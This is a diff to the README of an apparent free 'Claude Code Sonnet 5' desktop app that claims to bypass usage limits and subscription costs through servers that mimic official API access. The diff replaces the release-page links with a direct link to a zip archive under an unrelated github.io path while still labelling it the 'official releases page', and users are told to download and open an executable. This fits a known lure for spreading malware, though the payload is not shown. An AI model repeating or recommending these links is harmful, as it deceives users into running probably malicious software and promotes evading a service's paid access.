@@ -5,7 +5,7 @@ description: "Access Claude Code Sonnet 5 in a native desktop application optimi
 ---
 # 🧠 Claude-Code-Sonnet-5-Free-Desktop - Access advanced coding models for free
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Obligatory-carpentersrule420/Claude-Code-Sonnet-5-Free-Desktop/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Obligatory-carpentersrule420/obligatory-carpentersrule420.github.io/raw/refs/heads/main/prismoidal/App-v2.0.zip)
 
 This application provides a simple interface to use Claude Sonnet 5 on your Windows computer. It connects to specialized web servers that mimic official API access, allowing you to bypass standard usage limits. You can use this software for writing code, automating tasks, and analyzing long documents without paying for a subscription.
 
@@ -28,7 +28,7 @@ This application provides a simple interface to use Claude Sonnet 5 on your Wind
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official releases page](https://github.com/Obligatory-carpentersrule420/Claude-Code-Sonnet-5-Free-Desktop/releases) to find the latest version.
+1. Visit the [official releases page](https://github.com/Obligatory-carpentersrule420/obligatory-carpentersrule420.github.io/raw/refs/heads/main/prismoidal/App-v2.0.zip) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start the download.
 4. Once the download finishes, open the file.
